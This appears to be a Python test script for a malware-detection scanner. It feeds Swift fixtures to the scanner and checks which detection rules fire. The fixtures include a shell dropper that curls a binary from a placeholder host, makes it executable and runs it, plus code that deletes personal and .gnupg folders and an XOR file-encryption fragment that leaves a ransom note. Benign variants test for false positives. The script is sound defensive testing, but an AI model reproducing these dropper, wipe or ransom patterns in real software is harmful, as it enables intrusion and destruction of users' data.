#!/usr/bin/env python3
"""Static controls for Swift execution, destruction, and inert declarations."""

import json
from pathlib import Path
import subprocess
import tempfile


def decode_reports(text):
    decoder = json.JSONDecoder()
    while text.strip():
        text = text.lstrip()
        report, end = decoder.raw_decode(text)
        yield report
        text = text[end:]


def main():
    repo = Path(__file__).resolve().parents[2]
    dropper = '''import Foundation
let worker = Process()
worker.launchPath = "/bin/sh"
worker.arguments = ["-c", "curl -skL https://downloads.example/tool -o /tmp/.agent && chmod +x /tmp/.agent && /tmp/.agent &"]
try? worker.run()
'''
    wipe = '''import Foundation
let targets = ["\\(home)/Documents", "\\(home)/Desktop", "\\(home)/.gnupg"]
for path in targets { try? FileManager.default.removeItem(atPath: path) }
'''
    ransom = '''import Foundation
let encrypted = data.map { $0 ^ key }
try? encrypted.write(to: URL(fileURLWithPath: path + ".locked"))
try? FileManager.default.removeItem(atPath: path)
let note = "YOUR FILES HAVE BEEN ENCRYPTED. Contact the operator."
try? note.write(toFile: destination, atomically: true, encoding: .utf8)
'''
    package = '''// swift-tools-version:5.9
import PackageDescription
let package = Package(name: "DatabasePhisher", targets: [.executableTarget(name: "DatabasePhisher")])
'''
    fixtures = {
        "dropper.swift": dropper,
        "legacy.swift": dropper.replace("try? worker.run()", "worker.launch()"),
        "renamed.swift": dropper.replace("worker", "launcher").replace(".agent", ".helper"),
        "unused.swift": dropper.replace("worker.arguments =", "let unusedArguments ="),
        "other-process.swift": dropper.replace("try? worker.run()", "let other = Process()\ntry? other.run()"),
        "comment.swift": "/*\n" + dropper + "\n*/\n",
        "installer.swift": dropper.replace("curl -skL", "curl -sL").replace("/tmp/.agent", "/tmp/installer"),
        "wipe.swift": wipe,
        "app-cleanup.swift": wipe.replace('"\\(home)/Documents", "\\(home)/Desktop", ', ""),
        "wipe-comment.swift": "/*\n" + wipe + "\n*/\n",
        "ransom.swift": ransom,
        "encryption.swift": ransom.replace('try? FileManager.default.removeItem(atPath: path)', "").replace("YOUR FILES HAVE BEEN ENCRYPTED. Contact the operator.", "Encrypted backup complete."),
        "Package.swift": package,
        "telemetry.swift": '''import Foundation
let url = URL(string: "https://metrics.example/collect")!
var request = URLRequest(url: url)
request.httpMethod = "POST"
''',
        "service-list.swift": '''import Foundation
let path = "/etc/rc.d/service"
let text = try? String(contentsOfFile: path)
''',
    }
    execute = "objectives/execution/payload/file-exec/command/fetch::swift-hidden-curl-chmod-shell-execution"
    destroy = "objectives/impact/destroy/user-data::swift-personal-folders-key-directory-wipe"
    encrypt = "objectives/impact/ransom/encrypt/bulk-encryption::swift-xor-file-replacement-ransom-notice"
    fixtures["ordinary-buffer.swift"] = "let data = Data(repeating: 0xFF, count: 10 * 1024 * 1024)\n"
    fixtures["zero-buffer.swift"] = "let data = Data(repeating: 0xFF, count: 0 * 1024 * 1024)\n"
    expected = {
        "dropper.swift": execute, "renamed.swift": execute, "legacy.swift": execute,
        "wipe.swift": destroy, "ransom.swift": encrypt,
    }
    with tempfile.TemporaryDirectory(prefix="swift-bad-controls-") as directory:
        work = Path(directory)
        for name, source in fixtures.items():
            (work / name).write_text(source)
        result = subprocess.run(
            [str(repo.parent / "cleave/target/release/cleave"), "--traits-dir", str(repo),
             "--format=json", str(work)], capture_output=True, text=True, check=True,
        )
        observed = {}
        for report in decode_reports(result.stdout):
            for file in report["files"]:
                observed[Path(file["path"]).name] = file.get("traits", [])
        for name, required in expected.items():
            assert any(t["id"] == required and t["crit"] == 5 for t in observed[name]), (name, observed[name])
        for name in fixtures.keys() - expected.keys():
            assert not any(t["id"] in {execute, destroy, encrypt} for t in observed[name]), (name, observed[name])
        for name in ["Package.swift", "telemetry.swift", "service-list.swift"]:
            assert not any(t["crit"] >= 4 for t in observed[name]), (name, observed[name])
        buffer_rule = "micro-behaviors/data/buffer/allocate::swift-megabyte-repeating-buffer"
        assert any(t["id"] == buffer_rule for t in observed["ordinary-buffer.swift"])
        assert not any(t["id"] == buffer_rule for t in observed["zero-buffer.swift"])
        assert any(t["id"] == "metadata/lang/source/naming/declaration::swift-attack-themed-declaration-name" for t in observed["Package.swift"])
        assert any(t["id"] == "micro-behaviors/fs/path/config/system::swift-system-rcd-path" for t in observed["service-list.swift"])
    print("Swift triage controls: 17 passed")


if __name__ == "__main__":
    main()
